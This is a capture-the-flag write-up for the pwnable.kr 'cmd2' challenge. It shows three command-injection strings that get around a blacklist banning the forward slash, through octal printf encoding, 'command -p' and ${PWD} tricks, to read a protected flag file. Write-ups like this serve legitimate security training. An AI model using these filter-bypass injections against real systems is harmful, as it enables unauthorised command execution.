# 15 - cmd2

## The Challenge

Daddy bought me a system command shell. but he put some filters to prevent me from playing with it without his permission... but I wanna play anytime I want!

ssh cmd2@pwnable.kr -p2222 \(pw:flag of cmd1\)

## The Solution

Another blacklisting challenge, this time on steroids. The greatest hurdle is the prohibition on using forward slash.

### Solution \#1 - Octal Encoding

`dash` supports octal encoding \[not hex\]. It's important to surround the argument with single quotes so `printf` wont execute before being passed as an argument.

```text
./cmd2 '$(printf "\57bin\57cat fla*")'
```

### Solution \#2 - Builtin Secrets

Bash has a builtin named `command`. It can be used with the flag `-p` to revert to default function lookup.

```text
./cmd2 'command -p cat fla*'
```

### Solution \#3 - ${PWD}

If you navigate to the root directory $PWD will equal to, well, forward slash.

```text
./cmd2 'cd ..;cd ..; ${PWD}bin${PWD}cat ${PWD}home${PWD}cmd2${PWD}fla*'
```
